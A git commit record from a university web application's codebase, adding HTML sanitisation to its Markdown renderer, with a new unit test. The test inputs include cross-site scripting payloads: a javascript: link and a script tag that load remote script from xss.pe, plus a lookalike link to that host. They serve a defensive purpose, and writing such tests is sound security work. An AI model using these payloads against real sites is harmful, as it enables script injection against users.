2102a760cab341734925d63ddfdf86460d213d6a
Kai Lan <K.Lan@warwick.ac.uk>
2018-11-07 14:58:12 +0000

    Merge pull request #2166 in TAB/tabula from TAB-6685 to develop
    Squashed commit of the following:
    
    commit b4f5206b7b8b0775d897bef7887f0285580d032c
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 14:47:51 2018 +0000
    
        TAB-6685 update test accordingly
    
    commit 5a86a450e7a73112e33e8f70305674b79b01d208
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 14:16:06 2018 +0000
    
        TAB-6685 not being used anymore, removing.
    
    commit 0611a3c30595b9cacbee16abe42f019b785b4a4f
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 14:11:48 2018 +0000
    
        TAB-6685 not needed, as it defaults to true
    
    commit 9fbfc0e56aa33b5964d9a7945be13dd56f35a442
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 14:10:33 2018 +0000
    
        TAB-6685 typo
    
    commit 5fabfc64b3d0e771ec19252991a64311ba3cca6a
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 14:05:27 2018 +0000
    
        TAB-6685 no more ^
    
    commit 386e8d00ab8d6765632d2dead2983aeadd207ac4
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 14:01:43 2018 +0000
    
        TAB-6685 match *.warwick.ac.uk and warwick.ac.uk
    
    commit 4f267513333650e191d62a1be6347c891af3cafc
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 13:44:55 2018 +0000
    
        TAB-6685 no need to use xor here...
    
    commit 93fe52b20585195cbaa4ffc5eaf5224ee47769e5
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 13:42:42 2018 +0000
    
        TAB-6685 these should not be commented out
    
    commit 578f82569da3818be90a0bad0f27fa64414464d0
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 13:39:55 2018 +0000
    
        TAB-6685 fix broken test case
    
    commit c47ebfc935ab61cc0aaa283c1ee192b7226205a3
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 13:29:41 2018 +0000
    
        TAB-6685 allowing http on links as we only allow warwick.ac.uk domain
    
    commit 379a712233b0fc530ead29e42d888117e6b4ae41
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 12:07:36 2018 +0000
    
        TAB-6685 unused import
    
    commit b9d7ddef685471b80c2e4293863b4b0f3f5657fa
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Wed Nov 7 12:05:52 2018 +0000
    
        TAB-6685 i've never liked regex, replacing it with predicate, and it seems to work fine.
    
    commit 103fb8f49fa5151817883ee6432f5d632f4546d8
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Tue Nov 6 17:27:06 2018 +0000
    
        TAB-6685 test cases for href of a
    
    commit c045221182d7482a89ec1f4f16469827bc9c76a7
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Tue Nov 6 17:26:47 2018 +0000
    
        TAB-6685 pattern match href in a
    
    commit d20c1c7e4486205217f4cabf79b45767cc31af9d
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Tue Nov 6 14:20:18 2018 +0000
    
        TAB-6685 sanitise in MarkdownParsingController
    
    commit d743af9e458e6b41e08de76ca568e41e4f831b17
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Tue Nov 6 13:56:40 2018 +0000
    
        TAB-6685 defaults to not sanitise
    
    commit cf1c7e9f89f6a1796bea5130399ce93b5526e37a
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Tue Nov 6 12:22:14 2018 +0000
    
        TAB-6685 use the sanitiser
    
    commit 5e42daea3178a829ad4ad71de6be32cb262baa2e
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Tue Nov 6 12:03:17 2018 +0000
    
        TAB-6685 sanitiser dependency
    
    commit 160f9b3a0a764dad027d09b5976d09a094334327
    Author: Kai Lan <k.lan@warwick.ac.uk>
    Date:   Tue Nov 6 11:58:15 2018 +0000
    
        TAB-6685 unit test to verify the reported behaviour

--- common/src/test/scala/uk/ac/warwick/tabula/web/views/MarkdownRendererTest.scala
+++ common/src/test/scala/uk/ac/warwick/tabula/web/views/MarkdownRendererTest.scala
@@ -15,23 +15,25 @@ class MarkdownRendererTest extends TestBase {
 
 	// Trying to reproduce ClassCast error.
 	@Test def TAB_2169() {
-		val input = """This message confirms that you made a submission for the assignment 'Assessment 2' for EC204 Economics 2.
-									|
-									|- Submission date: ${submissionDate}
-									|- Submission ID: ${submission.id}
-									|- University ID: ${user.warwickId}
-									|
-									|Uploaded attachments:
-									|
-									|- Whatever
-									|- Who cares
-								""".stripMargin
-		val output = renderer.renderMarkdown(input)
-		output should (include("<li>Whatever</li>") and include("<li>University ID: ${user.warwickId}</li>"))
+		val input =
+			"""This message confirms that you made a submission for the assignment 'Assessment 2' for EC204 Economics 2.
+				|
+				|- Submission date: ${submissionDate}
+				|- Submission ID: ${submission.id}
+				|- University ID: ${user.warwickId}
+				|
+				|Uploaded attachments:
+				|
+				|- Whatever
+				|- Who cares
+			""".stripMargin
+		renderer.renderMarkdown(input) should (include("<li>Whatever</li>") and include("<li>University ID: ${user.warwickId}</li>"))
 
 		// Check multithreadedness by rendering a lot at once.
-		val results = (1 to 10).map (
-			i => Future { renderer.renderMarkdown(input + i) 	}
+		val results = (1 to 10).map(
+			i => Future {
+				renderer.renderMarkdown(input + i)
+			}
 		)
 
 		for (result <- results) {
@@ -44,6 +46,99 @@ class MarkdownRendererTest extends TestBase {
 		}
 	}
 
+	@Test
+	def sanitise(): Unit = {
+		val input1 =
+			"""
+				|Unable to load Tabula. Click to [try again](javascript:document.body.appendChild(document.createElement('script')).setAttribute('src','//xss.pe/t'))
+			""".stripMargin
+		val output1: String = renderer.renderMarkdown(input1)
+
+		output1.contains("javascript:") should be(false)
+		output1.contains("<a") should be(false)
+		output1.contains("document.") should be(false)
+		output1.contains("xss.pe") should be(false)
+
+		val input2 =
+			"""
+				|*foo*ï¼œ<script src=//xss.pe/t>**foo**</script>
+			""".stripMargin
+		val output2: String = renderer.renderMarkdown(input2)
+
+		output2.contains("<script") should be(false)
+		output2.contains("/script>") should be(false)
+		output2.contains("xss.pe") should be(false)
+
+
+		// fine within *.warwick.ac.uk domain
+		val input3 =
+			"""
+				|thisisfine [magiclink](https://www.warwick.ac.uk "isthisfine").
+			""".stripMargin
+
+		val output3 = renderer.renderMarkdown(input3)
+
+		output3.trim should be(
+			"""
+				|<p>thisisfine <a href="https://www.warwick.ac.uk" title="isthisfine">magiclink</a>.</p>
+			""".stripMargin.trim)
+
+
+		// fine within *.warwick.ac.uk domain
+		val input4 =
+			"""
+				|thisisfine [magiclink](https://shylock.warwick.ac.uk "isthisfine").
+			""".stripMargin
+
+		val output4 = renderer.renderMarkdown(input4)
+
+		output4.trim should be(
+			"""
+				|<p>thisisfine <a href="https://shylock.warwick.ac.uk" title="isthisfine">magiclink</a>.</p>
+			""".stripMargin.trim)
+
+
+		// NOT fine with non warwick domain
+		val input5 =
+			"""
+				|thisIsNotFine [darkMagicLink](https://shylock.adam.ac.uk "notFineNotFine").
+			""".stripMargin
+
+		val output5 = renderer.renderMarkdown(input5)
+
+		output5.trim should be(
+			"""
+				|<p>thisIsNotFine <a title="notFineNotFine">darkMagicLink</a>.</p>
+			""".stripMargin.trim)
+
+		// fine within warwick.ac.uk
+		val input6 =
+			"""
+				|thisisfine [magiclink](https://warwick.ac.uk "isthisfine").
+			""".stripMargin
+
+		val output6 = renderer.renderMarkdown(input6)
+
+		output6.trim should be(
+			"""
+				|<p>thisisfine <a href="https://warwick.ac.uk" title="isthisfine">magiclink</a>.</p>
+			""".stripMargin.trim)
+
+		// not fine
+		val input7 =
+			"""
+				|notFine [darkMagicLink](https://xss.pe/evil.warwick.ac.uk "notFineNotFine").
+			""".stripMargin
+
+		val output7 = renderer.renderMarkdown(input7)
+
+		output7.trim should be(
+			"""
+				|<p>notFine <a title="notFineNotFine">darkMagicLink</a>.</p>
+			""".stripMargin.trim)
+
+
+	}
 
 
 }
